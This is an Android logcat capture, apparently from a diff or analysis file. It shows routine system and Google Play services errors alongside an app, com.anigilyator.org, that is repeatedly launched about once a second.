+12-05 18:54:53.769  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 8us total 2.248ms
+12-05 18:54:53.769  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:54.435  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:54.684  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:54.684  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:54.721  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:54.722  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1127KB/2MB, paused 18us total 4.771ms
+12-05 18:54:55.054  5398  6090 I Dialer  : OmtpVvmCarrierCfgHlpr - OmtpEvent:CONFIG_STATUS_SMS_TIME_OUT
+12-05 18:54:55.054  5398  5398 I Dialer  : RetryPolicy - discarding deferred status: configuration_state=4
+12-05 18:54:55.055  5398  5398 I Dialer  : VvmTaskExecutor - no more tasks, stopping service if no task are added in 5000 millis
+12-05 18:54:55.057  5398  5398 I Dialer  : VvmTaskReceiver - task received
+12-05 18:54:55.057  5398  5398 I Dialer  : VvmTaskReceiver - TaskExecutor already running
+12-05 18:54:55.057  5398  5398 I Dialer  : Task.createTask - create task:com.android.voicemail.impl.ActivationTask
+12-05 18:54:55.058  5398  5398 I Dialer  : RetryPolicy - retry #2 for com.android.voicemail.impl.ActivationTask@b6198cb queued, executing in 5000
+12-05 18:54:55.058  5398  5398 I Dialer  : VvmTaskExecutor - com.android.voicemail.impl.ActivationTask@b6198cb added
+12-05 18:54:55.058  5398  5398 I Dialer  : VvmTaskExecutor - minimal wait time:5000
+12-05 18:54:55.058  5398  5398 I Dialer  : VvmTaskExecutor - sleep for 5000 millis
+12-05 18:54:55.423  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:55.703  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:55.703  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:55.722  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:55.723  6639  6676 I zygote  : Explicit concurrent copying GC freed 39561(1296KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1127KB/2MB, paused 10us total 2.573ms
+12-05 18:54:54.431  1641  1895 I chatty  : uid=1000(system) Binder:1641_5 identical 1 line
+12-05 18:54:55.422  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:56.434  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:56.435  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:56.846  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:54:56.846  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:56.865  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:56.866  6639  6676 I zygote  : Explicit concurrent copying GC freed 39567(1296KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 12us total 2.996ms
+12-05 18:54:57.453  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:57.457  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:57.994  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:54:57.995  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:58.013  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:58.014  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 10us total 2.487ms
+12-05 18:54:58.449  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:58.962  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:54:58.962  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:58.988  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:58.991  6639  6676 I zygote  : Explicit concurrent copying GC freed 39550(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 12us total 3.537ms
+12-05 18:55:00.063  5398  6090 I Dialer  : VvmTaskExecutor - executing task com.android.voicemail.impl.ActivationTask@b6198cb
+12-05 18:55:00.063  5398  6090 I Dialer  : PreOMigrationHandler - ComponentInfo{com.android.phone/com.android.services.telephony.TelephonyConnectionService}, [****], UserHandle{0} already migrated
+12-05 18:55:00.078  5398  6090 I Dialer  : VvmActivationTask - VVM content provider configured - vvm_type_cvvm
+12-05 18:55:00.078  5398  6090 I Dialer  : OmtpVvmCarrierCfgHlpr - OmtpEvent:CONFIG_ACTIVATING
+12-05 18:55:00.086  5398  6090 I Dialer  : TelephonyMangerCompat.setVisualVoicemailSmsFilterSettings - using TelephonyManager
+12-05 18:55:00.088  5398  6090 I Dialer  : TelephonyMangerCompat.sendVisualVoicemailSms - using TelephonyManager
+12-05 18:55:00.606  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:58.447  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:01.054  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:01.056  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:01.084  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:01.434  2276  2276 I BgTaskExecutorImpl: Starting EXCLUSIVE background task UPLOAD_ASSISTANT_DEVICE_SETTINGS.
+12-05 18:55:01.439  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:01.440  2276  6915 I NetworkRecognitionRnr: Using pair HTTP connection
+12-05 18:55:01.441  2276  2563 I PairHttpConnection: [Upload] Connected
+12-05 18:55:01.446  1641  1767 I WifiService: getWifiEnabledState uid=10032
+12-05 18:55:01.453  2276  2459 W CronetNetworkRqstWrppr: Upload request without a content type.
+12-05 18:55:01.479  2276  2283 I zygote  : Do full code cache collection, code=504KB, data=250KB
+12-05 18:55:01.479  2276  2283 I zygote  : After code cache collection, code=406KB, data=188KB
+12-05 18:55:01.515  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:55:01.515  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:01.535  6639  6676 I zygote  : Explicit concurrent copying GC freed 12711(484KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1112KB/2MB, paused 12us total 3.094ms
+12-05 18:55:01.535  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:01.568  2276  5510 I PairHttpConnection: [Download] starting read
+12-05 18:55:01.568  2276  2276 W UploadSettingsTask: Failed to sync device settings.
+12-05 18:55:01.568  2276  2276 I UploadSettingsTask: Retrying to sync device settings.
+12-05 18:55:01.571  2276  2563 W S3NetworkUtils: [Upload] response code: 401, internal error header: -83905
+12-05 18:55:02.425  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:02.457  2186  2186 D BoundBrokerSvc: onUnbind: Intent { act=com.google.android.gms.auth.service.START pkg=com.google.android.gms }
+12-05 18:55:02.602  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:55:02.602  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:02.624  6639  6676 I zygote  : Explicit concurrent copying GC freed 39646(1281KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 2.928ms
+12-05 18:55:02.624  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:02.750  2016  2016 D BoundBrokerSvc: onUnbind: Intent { act=com.google.android.gms.phenotype.service.START cmp=com.google.android.gms/.chimera.PersistentApiService }
+12-05 18:55:03.432  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:03.683  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:55:03.683  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:03.703  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 11us total 2.972ms
+12-05 18:55:03.704  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:04.438  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:04.628  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:55:04.628  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:04.646  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:04.647  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 9us total 2.508ms
+12-05 18:55:05.428  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:05.535  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:05.535  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:05.554  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:05.554  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 9us total 2.407ms
+12-05 18:55:04.434  1641  1895 I chatty  : uid=1000(system) Binder:1641_5 identical 5 lines
+12-05 18:55:05.427  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:06.422  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:06.424  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:06.485  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:06.485  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:06.504  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1296KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 2.686ms
+12-05 18:55:06.504  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:07.427  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:07.431  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:07.447  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:07.447  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:07.473  6639  6676 I zygote  : Explicit concurrent copying GC freed 39561(1296KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 9us total 2.523ms
+12-05 18:55:07.473  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:08.432  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:08.442  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:08.443  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:08.470  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 13us total 3.741ms
+12-05 18:55:08.470  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:09.362  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:09.362  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:09.385  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:09.385  6639  6676 I zygote  : Explicit concurrent copying GC freed 39251(1264KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1127KB/2MB, paused 12us total 3.004ms
+12-05 18:55:09.449  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:10.342  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:10.342  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:10.366  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:10.366  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1127KB/2MB, paused 12us total 3.193ms
+12-05 18:55:10.439  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:11.322  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:11.322  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:11.343  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:11.343  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1127KB/2MB, paused 10us total 2.410ms
+12-05 18:55:11.443  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:12.284  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:12.284  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:12.302  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 9us total 2.428ms
+12-05 18:55:12.302  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:12.440  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:13.321  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:13.321  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:13.337  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 9us total 2.237ms
+12-05 18:55:13.337  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:13.436  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:14.241  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:14.241  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:14.266  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:14.269  6639  6676 I zygote  : Explicit concurrent copying GC freed 39544(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 16us total 3.520ms
+12-05 18:55:15.773  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:15.803  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:15.881  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:15.772  1641  2950 I chatty  : uid=1000(system) Binder:1641_E identical 7 lines
+12-05 18:55:15.802  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:16.435  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:16.438  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:16.503  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:16.503  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:16.518  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:16.518  6639  6676 I zygote  : Explicit concurrent copying GC freed 13164(484KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1127KB/2MB, paused 9us total 2.482ms
+12-05 18:55:17.430  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:17.483  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:17.483  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:17.499  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:17.499  6639  6676 I zygote  : Explicit concurrent copying GC freed 39573(1296KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1127KB/2MB, paused 9us total 2.428ms
+12-05 18:55:17.982  1641  1654 E memtrack: Couldn't load memtrack module
+12-05 18:55:17.982  1641  1654 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:17.985  2016  4057 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.netrec.module.NetRecGcmTaskService started execution. cause:4 exec_start_elapsed_seconds: 581 [CONTEXT service_id=218 ]
+12-05 18:55:17.992  2016  4057 I NetRec  : [202] anai.a: Refreshing scores for 1 networks.
+12-05 18:55:17.996  2016  2016 D BoundBrokerSvc: onBind: Intent { act=com.google.android.gms.phenotype.service.START cmp=com.google.android.gms/.chimera.PersistentApiService }
+12-05 18:55:17.996  2016  2016 D BoundBrokerSvc: Loading bound service for intent: Intent { act=com.google.android.gms.phenotype.service.START cmp=com.google.android.gms/.chimera.PersistentApiService }
+12-05 18:55:18.006  2186  2186 D BoundBrokerSvc: onBind: Intent { act=com.google.android.gms.auth.service.START pkg=com.google.android.gms }
+12-05 18:55:18.006  2186  2186 D BoundBrokerSvc: Loading bound service for intent: Intent { act=com.google.android.gms.auth.service.START pkg=com.google.android.gms }
+12-05 18:55:18.012  2016  2533 W GLSUser : [DeviceKeyStore] Cannot load key: Device key file not found.
+12-05 18:55:18.012  2016  2533 W GLSUser : [DeviceKeyStore] Cannot load key: Device key file not found.
+12-05 18:55:18.016  2016  2406 E apzj    : Phenotype API error. Event # ceqj@6c5a5ded, EventCode: 12 [CONTEXT service_id=51 ]
+12-05 18:55:18.016  2016  2406 E apzj    : apyo: 29503
+12-05 18:55:18.016  2016  2406 E apzj    : 	at apzp.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):25)
+12-05 18:55:18.016  2016  2406 E apzj    : 	at apzj.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):4)
+12-05 18:55:18.016  2016  2406 E apzj    : 	at apzj.fV(:com.google.android.gms@204217022@20.42.17 (040700-342117392):12)
+12-05 18:55:18.016  2016  2406 E apzj    : 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):9)
+12-05 18:55:18.016  2016  2406 E apzj    : 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:55:18.016  2016  2406 E apzj    : 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:55:18.016  2016  2406 E apzj    : 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:55:18.016  2016  2406 E apzj    : 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:55:18.016  2016  2406 E apzj    : 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:55:18.016  2016  2406 E apzj    : 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:55:18.016  2016  2406 E apzj    : 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:55:18.016  2016  2406 E AsyncOperation: operation=GetCommittedConfigurationOperationCall, opStatusCode=29503 [CONTEXT service_id=51 ]
+12-05 18:55:18.016  2016  2406 E AsyncOperation: OperationException[Status{statusCode=unknown status code: 29503, resolution=null}]
+12-05 18:55:18.016  2016  2406 E AsyncOperation: 	at apzj.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:55:18.016  2016  2406 E AsyncOperation: 	at apzj.fV(:com.google.android.gms@204217022@20.42.17 (040700-342117392):12)
+12-05 18:55:18.016  2016  2406 E AsyncOperation: 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):9)
+12-05 18:55:18.016  2016  2406 E AsyncOperation: 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:55:18.016  2016  2406 E AsyncOperation: 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:55:18.016  2016  2406 E AsyncOperation: 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:55:18.016  2016  2406 E AsyncOperation: 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:55:18.016  2016  2406 E AsyncOperation: 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:55:18.016  2016  2406 E AsyncOperation: 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:55:18.016  2016  2406 E AsyncOperation: 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:55:18.017  2016  2603 E NetRec  : [129] amxc.c: Could not retrieve server token for package com.google.android.apps.gcs
+12-05 18:55:18.017  2016  2603 E NetRec  : java.util.concurrent.ExecutionException: ryf: 29503: 
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at axac.l(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at axac.f(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at amxc.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at amxc.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at amxb.getHeaders(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at com.android.volley.toolbox.HttpClientStack.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):18)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at sym.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at bsk.executeRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at com.android.volley.toolbox.BasicNetwork.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):3)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at syn.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):17)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at com.android.volley.NetworkDispatcher.processRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at com.android.volley.NetworkDispatcher.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at com.android.volley.NetworkDispatcher.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:55:18.017  2016  2603 E NetRec  : Caused by: ryf: 29503: 
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at sdv.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at apyy.o(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at apzp.e(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at aaso.p(:com.google.android.gms@204217022@20.42.17 (040700-342117392):4)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):11)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:55:18.017  2016  2603 E NetRec  : 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:55:18.017  2016  2603 W NetRec  : [129] amxc.a: No server tokens extracted.
+12-05 18:55:18.158  2016  2603 E Volley  : [129] NetworkUtility.d: Unexpected response code 400 for https://mobilenetworkscoring-pa.googleapis.com/v1/GetWifiQuality?key=AIzaSyBrlVtd67QvwS_Wz0Do4ZIdOeA6ThtVczU
+12-05 18:55:18.158  2016  4057 I NetRec  : [202] anai.c: Will retry failed rapid_refresh_scores_task task as standard refresh.
+12-05 18:55:18.160  2016  4057 W NetRec  : [202] anai.a: Unexpected exception com.android.volley.ClientError while waiting for score updates (com.android.volley.ClientError). Returning 2.
+12-05 18:55:18.161  2016  4057 I NetRec  : [202] NetRecChimeraGcmTaskService.a: Still entries pending update, scheduling new rapid_refresh_scores_task refresh.
+12-05 18:55:18.162  2016  4057 I NetRec  : [202] NetRecChimeraGcmTaskService.a: Completed rapid_refresh_scores_task score refresh task in 171 ms, returning 2
+12-05 18:55:18.166  2016  6318 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.netrec.module.NetRecGcmTaskService finished executing. cause:4 result: 2 elapsed_millis: 188 uptime_millis: 188 exec_start_elapsed_seconds: 581 [CONTEXT service_id=218 ]
+12-05 18:55:18.189  2016  4785 I NetRec  : [223] anai.a: Refreshing scores for 1 networks.
+12-05 18:55:18.190  2016  4057 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.netrec.module.NetRecGcmTaskService started execution. cause:5 exec_start_elapsed_seconds: 581 [CONTEXT service_id=218 ]
+12-05 18:55:18.195  2016  2027 W GLSUser : [DeviceKeyStore] Cannot load key: Device key file not found.
+12-05 18:55:18.195  2016  2027 W GLSUser : [DeviceKeyStore] Cannot load key: Device key file not found.
+12-05 18:55:18.197  2016  2406 E apzj    : Phenotype API error. Event # ceqj@6c5a5ded, EventCode: 12 [CONTEXT service_id=51 ]
+12-05 18:55:18.197  2016  2406 E apzj    : apyo: 29503
+12-05 18:55:18.197  2016  2406 E apzj    : 	at apzp.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):25)
+12-05 18:55:18.197  2016  2406 E apzj    : 	at apzj.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):4)
+12-05 18:55:18.197  2016  2406 E apzj    : 	at apzj.fV(:com.google.android.gms@204217022@20.42.17 (040700-342117392):12)
+12-05 18:55:18.197  2016  2406 E apzj    : 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):9)
+12-05 18:55:18.197  2016  2406 E apzj    : 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:55:18.197  2016  2406 E apzj    : 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:55:18.197  2016  2406 E apzj    : 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:55:18.197  2016  2406 E apzj    : 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:55:18.197  2016  2406 E apzj    : 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:55:18.197  2016  2406 E apzj    : 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:55:18.197  2016  2406 E apzj    : 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:55:18.197  2016  2406 E AsyncOperation: operation=GetCommittedConfigurationOperationCall, opStatusCode=29503 [CONTEXT service_id=51 ]
+12-05 18:55:18.197  2016  2406 E AsyncOperation: OperationException[Status{statusCode=unknown status code: 29503, resolution=null}]
+12-05 18:55:18.197  2016  2406 E AsyncOperation: 	at apzj.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:55:18.197  2016  2406 E AsyncOperation: 	at apzj.fV(:com.google.android.gms@204217022@20.42.17 (040700-342117392):12)
+12-05 18:55:18.197  2016  2406 E AsyncOperation: 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):9)
+12-05 18:55:18.197  2016  2406 E AsyncOperation: 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
